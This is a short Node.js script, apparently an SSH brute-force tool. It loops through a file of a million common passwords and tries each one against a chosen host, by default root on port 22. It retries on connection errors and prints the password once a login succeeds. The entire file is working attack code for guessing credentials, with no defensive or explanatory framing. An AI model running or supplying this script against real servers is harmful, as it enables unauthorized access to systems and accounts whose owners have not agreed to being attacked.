
const connect = require('./utils/ssh')
const options = require('minimist')(process.argv)
const humanizeDuration = require('humanize-duration')
const lineByLine = require('n-readlines');
const fs = require('fs');

let passwordDiscovered = null
const start = Date.now()
const host = options.host || '127.0.0.1'
const port = options.port || 22
const username = options.username || 'root'
const verbose = options.verbose || options.v

const liner = new lineByLine('./data/10-million-password-list-top-1000000.txt');

async function main() {

  while (line = liner.next()) {
    const password = line.toString()
    const check = async () => {
      try {
        await connect({
          host,
          username,
          port,
          password,
        })
        passwordDiscovered = password

        console.info(`\nElapsed time: ${humanizeDuration(Date.now() - start)}`)
        console.info(`The password is "${passwordDiscovered}"\n`)

        process.exit(0)
      } catch (error) {
        if (error.level !== 'client-authentication') {
          if (verbose) {
            console.error(error.message)
          }
          await check()
        }
        process.stdout.write('.')
      }
    }
    await check()
  }
}
main()

